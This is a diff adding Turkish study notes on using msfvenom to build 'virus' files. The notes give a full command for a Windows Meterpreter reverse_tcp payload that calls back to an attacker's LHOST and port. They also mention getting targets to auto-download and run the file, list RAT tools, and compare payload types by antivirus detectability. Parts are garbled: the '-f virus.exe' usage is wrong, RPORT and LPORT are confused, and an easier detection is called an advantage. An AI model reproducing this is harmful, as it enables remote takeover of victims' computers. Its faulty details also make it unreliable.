@@ -1,0 +1,42 @@
+
+
+1. msfvenom bize istediğimiz sistemde çalışabilecek o sistemle ilgili uzantısı olan virüs dosyaları oluşturur.
+
+==> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.1.1.1 LPORT=5050 -f virus.exe
+
+	=> -p = payload 
+	=> windows yada android yada linux hangisi sisteme özel olacağı
+	=> shell olarak ne tercih edeceğimiz, meterpreter
+	=> bağlantı metodu, bind yada reverse 
+	=> LHOST = reverse_tcp kullandığımız için bize bağlanacakları local IP'miz.
+	=> LPORT = yine karşı pc bize bağlanacağı için local port adresimiz. ( çok kullanılmayn)
+	=> -f = dosya formatı, .exe, .apk, .py vs..
+
+2. reverse_tcp = Reverse tersten bağlanma demektir. Yani hedef makina bizim ürettiğimiz virüslü dosyayı çalıştırdığında ( ki bunu oto indirip çalıştır yapmayı öğren videolar var ) hedef bilgisayarı kendi bilgisayarımıza bağlarız.
+
+	- Hedef bilgisayarı kendi bilgisayarımıza bağlamak için LHOST bilgisi veririz.
+	- ifconfig en0 diyerek bunu öğrenebiliriz.
+
+	- RPORT bilgisi hedef bilgisayarın bizim bilgisayarımıza hangi porttan bağlanması gerektiğini söyleriz.
+
+
+3. Payload; karşı bilgisayarda çalıştırılmasını istediğimiz dosya.
+
+	- metasploit
+	- empire/cove
+	- njrat
+
+4. msfvenom -l payloads ; komutu bize kullanabileceğimiz bütün payloadları gösterir.
+
+5. Payloadlar 2'ye ayrılır. Stageless ( tek aşamalı ) ve çok aşamalı olmak üzere ayrılır.
+
+	- Tek aşamanın tez avantajı dosya boyutu büyüdüğü için antivirüs programları tarafından tespit edilebilmesi kolaylaşır.
+
+	- windows/meterpreter/reverse_tcp ise yani meterpreter'den sonra / geliyorsa çok aşamalı, 
+
+	- windows_meterpreter_reverse_tcp ise yani meterpreterden sonra _ geliyor stageless bir payload olduğunu gösterir.
+
+
+NOT : elf uzantılı dosyalar linux işletim sistemlerinde executable dosyalardır. Windowstaki .exe ile aynı
+
+
